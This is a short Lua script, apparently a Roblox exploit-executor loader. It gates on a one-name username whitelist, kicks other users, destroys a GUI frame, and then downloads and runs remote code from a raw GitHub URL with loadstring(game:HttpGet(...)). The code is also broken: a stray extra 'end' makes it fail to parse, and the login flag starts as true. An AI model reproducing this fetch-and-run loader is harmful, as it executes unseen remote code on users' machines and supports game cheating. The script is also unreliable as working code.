-- // Logins: // --

local Usernames = {
["Eyo"] = true;
}

-- // Variables: // --

local Login = game.CoreGui.Login

local Username = Login.Main.UserFrame.UserBox

local Userpassed = true



-- // Login Function: // --

if Usernames[Username.Text] then
Userpassed = true
else
game.Players.LocalPlayer:Kick("Invalid username.")
end


if Userpassed == true then
for i,v in pairs(game.CoreGui:GetDescendants()) do
 if v.Name == "Main" then
  v:Destroy()
 end
end
loadstring(game:HttpGet('https://raw.githubusercontent.com/Balligusapos/Balligusapos/main/popit'))()
end
end
